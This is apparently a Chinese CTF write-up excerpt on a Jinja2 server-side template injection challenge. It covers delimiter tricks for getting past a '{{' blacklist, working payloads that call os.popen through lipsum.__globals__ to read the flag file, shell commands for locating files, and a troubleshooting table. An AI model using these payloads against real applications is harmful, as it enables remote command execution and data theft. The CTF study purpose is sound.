## 二、知识点

> 展开在 WP 里，这里只留结论。

- **三种定界符**：`{{ }}` 输出表达式、`{% %}` 语句块、`{# #}` 注释 —— 禁掉一种还有别的路
- **`{% print(expr) %}` 可以替代 `{{ expr }}`**；`{% if 条件 %}文本{% endif %}` 连「输出表达式」都不需要
- **过滤只查原文**：`{{` 是子串黑名单，`{%` 不在名单里 —— 黑名单查的是"你发出去的字符串"
- **flag 的常见位置**：`/flag` 读不到时先 `ls -la /` 找应用目录，本题在 `/app/flag`
- **动态实例有时限**：NSSCTF 的靶机几小时回收，重新下发会换端口

## 三、案例 / payload

```jinja
{{ lipsum.__globals__["os"].popen("cat /app/flag").read() }}          # 第 1 关
{% print(lipsum.__globals__["os"].popen("cat /app/flag").read()) %}   # 第 2 关
```

```bash
find / -maxdepth 3 -iname *flag*     # 定位 flag 文件
ls -la /app                          # 看应用目录（flag 常和 app.py 放一起）
```

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| GET 传参没反应 | 只有 POST 才进 level 路由 | 用 POST form，参数名 `code` |
| 命令里的单引号导致 `No this level` | 单引号把 Jinja 的字符串字面量提前闭合了 | shell 命令统一用双引号包 |
| 以为 flag 在 `/flag` | 容器靶场常把 flag 放应用目录 | 先 `find` 一把梭，再 `ls -la` 确认 |
| 打一半全站 502 | 动态实例被回收 | 题目页重新下发实例（端口会变），复验旧 payload |
| 错误信息看不到 | 外层 `except Exception` 吞了异常 | 分段自证：先打 `{{ lipsum }}` 看有没有输出 |
